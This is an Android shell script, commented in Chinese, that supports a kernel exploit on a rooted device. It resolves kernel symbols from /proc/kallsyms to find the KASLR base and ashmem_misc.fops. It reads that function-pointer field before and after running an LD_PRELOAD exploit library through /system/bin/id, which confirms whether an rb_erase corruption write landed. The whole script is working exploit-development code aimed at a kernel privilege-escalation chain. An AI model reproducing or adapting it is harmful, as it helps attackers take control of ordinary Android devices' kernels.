#!/system/bin/sh
# diagnose_fops_write.sh — 在 rooted 设备上诊断 rb_erase 写入
# 用法: sh /data/local/tmp/diagnose_fops_write.sh
#
# 步骤:
# 1. 从 kallsyms 获取 ashmem_misc 地址
# 2. 用 kcore_read 读取 ashmem_misc.fops (偏移 +0x10)
# 3. 运行 exploit
# 4. 再次读取 ashmem_misc.fops
# 5. 比较前后值

KCORE_READ=/data/local/tmp/kcore_read
PRELOAD=/data/local/tmp/preload.so
BEFORE=/data/local/tmp/fops_before.bin
AFTER=/data/local/tmp/fops_after.bin

# 获取 ashmem_misc 地址
ASHMEM_MISC=$(cat /proc/kallsyms | grep ' D ashmem_misc$' | awk '{print $1}')
if [ -z "$ASHMEM_MISC" ]; then
    echo "FAIL: cannot find ashmem_misc in kallsyms"
    exit 1
fi
echo "ashmem_misc = 0x${ASHMEM_MISC}"

# 计算 fops 字段地址 (+0x10)
FOPS_ADDR=$(printf "0x%lx" $(( 0x${ASHMEM_MISC} + 0x10 )))
echo "ashmem_misc.fops = ${FOPS_ADDR}"

# 获取 _text 地址 (用于 KASLR base)
TEXT_ADDR=$(cat /proc/kallsyms | grep ' T _text$' | awk '{print $1}')
echo "_text = 0x${TEXT_ADDR}"
echo "KASLR base = 0x${TEXT_ADDR}"

# 读取 exploit 运行前的 fops 值
echo ""
echo "=== BEFORE exploit ==="
$KCORE_READ $FOPS_ADDR 8 $BEFORE
xxd $BEFORE

# 运行 exploit
echo ""
echo "=== Running exploit ==="
CFI_KASLR_BASE="0x${TEXT_ADDR}" LD_PRELOAD=$PRELOAD /system/bin/id 2>&1 | tail -5

# 读取 exploit 运行后的 fops 值
echo ""
echo "=== AFTER exploit ==="
$KCORE_READ $FOPS_ADDR 8 $AFTER
xxd $AFTER

# 比较
echo ""
echo "=== COMPARISON ==="
BEFORE_VAL=$(xxd -p $BEFORE)
AFTER_VAL=$(xxd -p $AFTER)
echo "before: ${BEFORE_VAL}"
echo "after:  ${AFTER_VAL}"
if [ "$BEFORE_VAL" = "$AFTER_VAL" ]; then
    echo "RESULT: fops UNCHANGED — rb_erase write did NOT happen"
else
    echo "RESULT: fops CHANGED — rb_erase write DID happen!"
    # 检查新值是否是内核地址
    NEW_VAL=$(xxd -p $AFTER | tac -rs .. | tr -d '\n')
    echo "new value: 0x${NEW_VAL}"
fi

# 清理
rm -f $BEFORE $AFTER
